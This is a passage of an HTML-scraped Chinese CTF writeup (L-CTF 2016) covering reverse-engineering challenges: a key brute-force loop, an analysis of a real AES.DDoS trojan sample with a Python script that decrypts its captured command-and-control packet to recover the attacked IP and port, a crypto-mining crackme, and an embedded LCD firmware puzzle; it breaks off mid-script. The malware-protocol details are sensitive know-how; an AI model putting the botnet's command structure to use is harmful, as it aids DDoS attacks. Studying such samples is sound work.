class="line number36 index35 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">int</code>&nbsp;<code class="cpp plain">map;&nbsp;</code></div><div class="line number37 index36 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">int</code>&nbsp;<code class="cpp plain">a,&nbsp;b,&nbsp;i;</code></div><div class="line number38 index37 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">char</code>&nbsp;<code class="cpp plain">tmp_1,&nbsp;tmp_2;</code></div><div class="line number39 index38 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp color1 bold">char</code>&nbsp;<code class="cpp plain">end_1,&nbsp;end_2,&nbsp;end_3,&nbsp;end_4;</code></div><div class="line number40 index39 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">for</code><code class="cpp plain">(i&nbsp;=&nbsp;0;&nbsp;i&nbsp;&lt;&nbsp;32;&nbsp;i+=4){</code></div><div class="line number41 index40 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp functions bold">printf</code><code class="cpp plain">(</code><code class="cpp string">"Num&nbsp;%d&nbsp;and&nbsp;%d:\n"</code><code class="cpp plain">,&nbsp;i,&nbsp;i+1);</code></div><div class="line number42 index41 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">for</code><code class="cpp plain">(a&nbsp;=&nbsp;0;&nbsp;a&nbsp;&lt;=&nbsp;0xFF;&nbsp;++a){</code></div><div class="line number43 index42 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">for</code><code class="cpp plain">(b&nbsp;=&nbsp;0;&nbsp;b&nbsp;&lt;=&nbsp;0xFF;&nbsp;++b){</code></div><div class="line number44 index43 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">all_a&nbsp;=&nbsp;a;</code></div><div class="line number45 index44 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">all_b&nbsp;=&nbsp;b;</code></div><div class="line number46 index45 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">map&nbsp;=&nbsp;(a&nbsp;&gt;&gt;&nbsp;2)&nbsp;&amp;&nbsp;0x3;</code></div><div class="line number47 index46 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">switch</code><code class="cpp plain">(map){</code></div><div class="line number48 index47 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">case</code>&nbsp;<code class="cpp plain">0:&nbsp;zero();</code><code class="cpp keyword bold">break</code><code class="cpp plain">;</code></div><div class="line number49 index48 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">case</code>&nbsp;<code class="cpp plain">1:&nbsp;one();</code><code class="cpp keyword bold">break</code><code class="cpp plain">;</code></div><div class="line number50 index49 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">case</code>&nbsp;<code class="cpp plain">2:&nbsp;two();</code><code class="cpp keyword bold">break</code><code class="cpp plain">;</code></div><div class="line number51 index50 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">case</code>&nbsp;<code class="cpp plain">3:&nbsp;three();</code><code class="cpp keyword bold">break</code><code class="cpp plain">;</code></div><div class="line number52 index51 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div><div class="line number53 index52 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">tmp_1&nbsp;=&nbsp;all_a;</code></div><div class="line number54 index53 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">tmp_2&nbsp;=&nbsp;all_b;</code></div><div class="line number55 index54 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">end_1&nbsp;=&nbsp;(tmp_1&nbsp;&amp;&nbsp;0x0F)&nbsp;+&nbsp;0x61;</code></div><div class="line number56 index55 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">end_2&nbsp;=&nbsp;((tmp_1&nbsp;&gt;&gt;&nbsp;4)&nbsp;&amp;&nbsp;0x0F)&nbsp;+&nbsp;0x61;</code></div><div class="line number57 index56 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">end_3&nbsp;=&nbsp;(tmp_2&nbsp;&amp;&nbsp;0x0F)&nbsp;+&nbsp;0x61;</code></div><div class="line number58 index57 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">end_4&nbsp;=&nbsp;((tmp_2&nbsp;&gt;&gt;&nbsp;4)&nbsp;&amp;&nbsp;0x0F)&nbsp;+&nbsp;0x61;</code></div><div class="line number59 index58 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp keyword bold">if</code><code class="cpp plain">((end_1&nbsp;==&nbsp;strkey[i])&nbsp;&amp;&amp;&nbsp;(end_2&nbsp;==&nbsp;strkey[i+1])&nbsp;&amp;&amp;&nbsp;(end_3&nbsp;==&nbsp;strkey[i+2])&nbsp;&amp;&amp;&nbsp;(end_4&nbsp;==&nbsp;strkey[i+3])){</code></div><div class="line number60 index59 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp functions bold">printf</code><code class="cpp plain">(</code><code class="cpp string">"%c%c\n"</code><code class="cpp plain">,&nbsp;a,&nbsp;b);</code></div><div class="line number61 index60 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}&nbsp;&nbsp;&nbsp;&nbsp;</code></div><div class="line number62 index61 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div><div class="line number63 index62 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div><div class="line number64 index63 alt1"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div><div class="line number65 index64 alt2"><code class="cpp spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="cpp plain">}</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br></span></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Re300</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Re300原本的出题人跑路了，我临时帮他出题。随手找了个DDoS木马。本着不互相伤害的原则。没有用MIPS版本，没有去掉符号表。所以就很easy了。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">首先，题目提供一个ELF可执行文件（re300）和抓的包（dump.pcap）。提示信息flag(ip:port)，那自然是找被打的ip和端口号了。关于此马的详细分析可参考 <a href="https://www.sans.org/reading-room/whitepapers/malicious/analyzing-backdoor-bot-mips-platform-35902R_y_RQ" _src="https://www.sans.org/reading-room/whitepapers/malicious/analyzing-backdoor-bot-mips-platform-35902R_y_RQ">https://www.sans.org/reading-room/whitepapers/malicious/analyzing-backdoor-bot-mips-platform-35902R_y_RQ</a></span><span style="font-family: 微软雅黑, &#39;Microsoft YaHei&#39;; text-indent: 2em;">因为使用AES加密数据包，遂家族命名为AES.DDoS。本样本产自China的变种台风ddos，支持多平台MIPS，Windows，Linux等。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">首先观察数据包，就那么几条。显然C&amp;C IP为192.168.168.133，上线端口48080，而Victim IP 为192.168.168.148（由第4个数据包可以确定）。那么可以确定第16个数据包，为中控IP像肉鸡发送的指令包。</span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t016d2e26dcaf9f0681.png" target="_blank"><img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t016d2e26dcaf9f0681.png" title="t0141c99c18055c7dff.png" alt="http://p2.qhimg.com/t0141c99c18055c7dff.png" style="visibility: visible;"></a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">懂得人自然懂。数据包的格式一般为【指令号+数据内容】在`_ConnectServerA`函数里，106行接收buffer，前4个字节表示指令号，当其为6时（118行），执行<strong>DealwithDDoS</strong>:</span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t019bf5cb6b669022c3.png" target="_blank"><img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t019bf5cb6b669022c3.png" title="t0122357461851a8cd5.png" alt="http://p7.qhimg.com/t0122357461851a8cd5.png" style="visibility: visible;"></a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">ok，接下来我们可以发现程序使用AES算法开始解密，同时注意到数据包中存在重复的数据`7df76b0c1ab899b33e42f047b91b546f`，很容易联想到分组加密的ECB（电码本）模式，并且分组长度是16，这点从key0也可以辅证。</span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t012978462f8239fdaf.png" target="_blank"><img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t012978462f8239fdaf.png" title="t011fabe22b155f3925.png" alt="http://p9.qhimg.com/t011fabe22b155f3925.png" style="visibility: visible;"></a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">由此我们可以解密出数据包。接下来就是找到数据包中表示ip和port的字段。这个看一下DealwithDDoS（128行）这个函数。数据包的偏移位置0x184表示attackMode(SYN,TCP,UDP...)，那0x188处就是轮数了吧。</span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t0114d0a3dfa5c4d505.png" target="_blank"><img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t0114d0a3dfa5c4d505.png" title="t0188d83a17e8287735.png" alt="http://p1.qhimg.com/t0188d83a17e8287735.png" style="visibility: visible;"></a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">随便挑一个mode跟进，SYN_Flood函数。40行和41行分别取出port，ip。至此，题目想要的数据已经分析出来了。</span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t0122243d9675c5262f.png" target="_blank"><img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t0122243d9675c5262f.png" title="t0123ec3acf3ee22239.png" alt="http://p3.qhimg.com/t0123ec3acf3ee22239.png" style="visibility: visible;"></a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">最后就是写脚本啦：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  python"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div></td><td class="code"><div class="container"><div class="line number1 index0 alt2"><code class="python keyword">from</code>&nbsp;<code class="python plain">Crypto.Cipher&nbsp;</code><code class="python keyword">import</code>&nbsp;<code class="python plain">AES</code></div><div class="line number2 index1 alt1"><code class="python keyword">from</code>&nbsp;<code class="python plain">struct&nbsp;</code><code class="python keyword">import</code>&nbsp;<code class="python plain">unpack</code></div><div class="line number3 index2 alt2"><code class="python keyword">from</code>&nbsp;<code class="python plain">hashlib&nbsp;</code><code class="python keyword">import</code>&nbsp;<code class="python plain">md5</code></div><div class="line number4 index3 alt1"><code class="python plain">with&nbsp;</code><code class="python functions">open</code><code class="python plain">(</code><code class="python string">'./re300'</code><code class="python plain">)&nbsp;as&nbsp;fp:</code></div><div class="line number5 index4 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">fp.seek(</code><code class="python value">0xe81ff</code><code class="python plain">)</code></div><div class="line number6 index5 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">key&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">fp.read(</code><code class="python value">16</code><code class="python plain">)</code></div><div class="line number7 index6 alt2"><code class="python plain">with&nbsp;</code><code class="python functions">open</code><code class="python plain">(</code><code class="python string">'./dump.pcap'</code><code class="python plain">)&nbsp;as&nbsp;fp:</code></div><div class="line number8 index7 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">data&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">fp.read()</code></div><div class="line number9 index8 alt2"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">idex&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">data.find(</code><code class="python string">'\x06\x00\x00\x00'</code><code class="python plain">)</code></div><div class="line number10 index9 alt1"><code class="python spaces">&nbsp;&nbsp;&nbsp;&nbsp;</code><code class="python plain">data&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">data[idex</code><code class="python keyword">+</code><code class="python value">4</code><code class="python plain">:idex</code><code class="python keyword">+</code><code class="python value">0x1a4</code><code class="python plain">]</code></div><div class="line number11 index10 alt2"><code class="python plain">aes&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">AES.new(key&nbsp;,&nbsp;AES.MODE_ECB)</code></div><div class="line number12 index11 alt1"><code class="python plain">text&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">aes.decrypt(data)</code></div><div class="line number13 index12 alt2"><code class="python plain">ip&nbsp;&nbsp;&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">text[:text.find(</code><code class="python string">'\x00'</code><code class="python plain">)]</code></div><div class="line number14 index13 alt1"><code class="python plain">port&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">unpack(</code><code class="python string">'&lt;H'</code><code class="python plain">,text[</code><code class="python value">0x1d4</code><code class="python keyword">-</code><code class="python value">0x54</code><code class="python plain">:][:</code><code class="python value">2</code><code class="python plain">])[</code><code class="python value">0</code><code class="python plain">]</code></div><div class="line number15 index14 alt2"><code class="python plain">flag&nbsp;</code><code class="python keyword">=</code>&nbsp;<code class="python plain">md5(ip</code><code class="python keyword">+</code><code class="python string">':'</code><code class="python keyword">+</code><code class="python functions">str</code><code class="python plain">(port)).hexdigest()</code></div><div class="line number16 index15 alt1"><code class="python functions">print</code>&nbsp;<code class="python string">'flag&nbsp;is:&nbsp;{0}'</code><code class="python plain">.</code><code class="python functions">format</code><code class="python plain">(flag)</code></div></div></td></tr></tbody></table><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><br></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><strong>Re 400</strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">题目试图用magic_file作为块链数据挖矿，挖到前3400个block之后，用他们的哈希值生成IV和Key，解密Flag字符串。题目除了去除了符号表之外，没有任何反调试和反分析内容，基本就是考察算法逆向能力。题目的一个切入点就是，通过trace可以发现在一系列函数中耗了很长时间，由此可以发现SHA256的相关代码，再分析上下文的代码，也就差不多能看出挖矿的过程了。结合题目前期给出的UID（转换成十进制搜索，可以发现是第一个block的Nonce值），以及后期给出的Bitcoin提示，应该是能明白程序在干什么的。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">相关代码已经上传到Github了，这里就不多介绍。</span></p><p style="text-indent: 2em; text-align: left;"><br></p><p style="text-indent: 2em; text-align: left;"><strong><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">Re 500</span></strong></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">关于Re500，首先向大家道歉，由于时间关系，出题人手残把SIU_PGPDO和SIU_PGPDI的地址值写反了，比赛结束后有队伍报告了这个问题……</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">这道题是一个跑在嵌入式设备中的程序，目标芯片是Freescale的MPC5674F，使用了Erika RTOS。程序原理是，初始化外部的LCD1602，并将flag打印到屏幕上。在设计的时候，我埋下的几个坑点有：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">有时候IDA导入时，默认开了VLE，你要自己在导入成功之后去Options里关掉VLE，然后Reanalyze一下（导入的时候关掉VLE是没作用的，不知道是我的使用方法不对还是他自己的bug，有知道的还望指点下）。这个在题目描述里实际也是有的（"I Hate Change"，VLE是变长指令集）；</span></p><p style="text-indent: 2em; text-align: center;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"><a href="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t01535f04d65d1c5e74.jpg" target="_blank"><img src="./【CTF攻略】L-CTF 2016 官方 Writeup - 安全客 - 有思想的安全新媒体_files/t01535f04d65d1c5e74.jpg" title="t01d201a15a76a2a896.jpg" alt="http://p0.qhimg.com/t01d201a15a76a2a896.jpg" style="visibility: visible;"></a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">无意把寄存器写反，坑了一波……这个真不是有意的……再次向表哥们低头；</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">有的队伍看到ELF就先去用qemu跑了，这个应该是跑不起来的……用TRACE32应该可以搞，不过未必比静态分析方便；</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">程序是跑在一个RTOS上的，所以如何把RTOS的代码和业务代码分开，对没有过相关开发或逆向经验的选手可能有点麻烦（不过也完全可以借助FLIRT）；</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">MCU和外设（LCD1602）的连线采用并行方式，但是D0-D7不是顺序接入的，有三根线被人为调换了位置，意在模拟由于PCB布线或生产问题，导致两个设备之间没办法用连续的一段IO口通信；</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">没有直接向LCD1602送出字符，而是先把字模写到了`CGRAM`，然后再显示到屏幕上，另外字模的显示字符和对应字母是不一致的，而且先解出来IO口的乱序规则才可以使用字模……；</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">有三段代码都能和LCD1602通信，但是仔细分析之后可以发现，只有一段代码比较像正确的代码，因为只有那段循环每次都有机会和外设通信，其他的是忽悠你的，毕竟连优先级都没有第一段高；</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">同样把代码传到了Github上，大家可以自行查阅。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">拿到题后先正确的载入到IDA中，然后最简单的方法是直接查看字符串，有一段以FAIL开头的字符串，找到引用函数，然后直接去读。这种方法根本不需要对RTOS和业务代码做区分，比较快。通过向外发送的控制字，以及将数组取出分析，可以知道这应该是在送字模，但是字模是乱掉的。解决办法就是，要么自己根据FLAG格式推测，要么从送控制字之前的几个移位操作分析出硬件连线。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;">解题脚本如下：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-size: 16px; font-family: 微软雅黑, &#39;Microsoft YaHei&#39;;"></span></p><table border="0" cellpadding="0" cellspacing="0" class="syntaxhighlighter  python"><tbody><tr><td class="gutter"><div class="line number1 index0 alt2">1</div><div class="line number2 index1 alt1">2</div><div class="line number3 index2 alt2">3</div><div class="line number4 index3 alt1">4</div><div class="line number5 index4 alt2">5</div><div class="line number6 index5 alt1">6</div><div class="line number7 index6 alt2">7</div><div class="line number8 index7 alt1">8</div><div class="line number9 index8 alt2">9</div><div class="line number10 index9 alt1">10</div><div class="line number11 index10 alt2">11</div><div class="line number12 index11 alt1">12</div><div class="line number13 index12 alt2">13</div><div class="line number14 index13 alt1">14</div><div class="line number15 index14 alt2">15</div><div class="line number16 index15 alt1">16</div><div class="line number17 index16 alt2">17</div><div class="line number18 index17 alt1">18</div><div class="line number19 index18 alt2">19</div><div class="line number20 index19 alt1">20</div><div class="line number21 index20 alt2">21</div><div class="line number22 index21 alt1">22</div><div class="line number23 index22 alt2">23</div><div class="line number24 index23 alt1">24</div><div class="line number25 index24 alt2">25</div><div class="line number26 index25 alt1">26</div><div class="line number27 index26 alt2">27</div><div class="line number28 index27 alt1">28</div><div class="line number29 index28 alt2">29</div><div class="line number30 index29 alt1">30</div><div class="line number31 index30 alt2">31</div><div class="line number32 index31 alt1">32</div><div class="line number33 index32 alt2">33</div><div class="line number34 index33 alt1">34</div><div class="line number35 index34 alt2">35</div><div class="line number36 index35 alt1">36</div><div class="line number37 index36 alt2">37</div><div class="line number38 index37 alt1">38</div><div class="line number39 index38 alt2">39</div><div class="line number40 index39 alt1">40</div><div class="line number41 index40 alt2">41</div><div class="line number42 index41 alt1">42</div><div class="line number43 index42 alt2">43</div><div class="line number44 index43 alt1">44</div><div class="line number45 index44 alt2">45</div><div class="line number46 index45 alt1">46</div><div class="line number47 index46 alt2">47</div><div class="line number48 index47 alt1">48</div><div class="line number49 index48 alt2">49</div><div class="line number50 index49 alt1">50</div><div class="line number51 index50 alt2">51</div><div class="line number52 index51 alt1">52</div><div class="line number53 index52 alt2">53</div><div class="line number54 index53 alt1">54</div><div class="line number55 index54 alt2">55</div><div class="line number56 index55 alt1">56</div><div class="line number57 index56 alt2">57</div><div class="line number58 index57 alt1">58</div><div class="line number59 index58 alt2">59</div><div class="line number60 index59 alt1">60</div><div class="line number61 index60 alt2">61</div><div class="line number62 index61 alt1">62</div><div class="line number63 index62 alt2">63</div><div class="line number64 index63 alt1">64</div><div class="line number65 index64 alt2">65</div><div class="line number66 index65 alt1">66</div><div class="line number67 index66 alt2">67</div><div class="line number68 index67 alt1">68</div><div class="line number69 index68 alt2">69</div><div class="line number70 index69 alt1">70</div><div class="line number71 index70 alt2">71</div><div class="line number72 index71 alt1">72</div><div class="line number73 index72 alt2">73</div><div class="line number74 index73 alt1">74</div><div class="line number75 index74 alt2">75</div><div class="line number76 index75 alt1">76</div><div 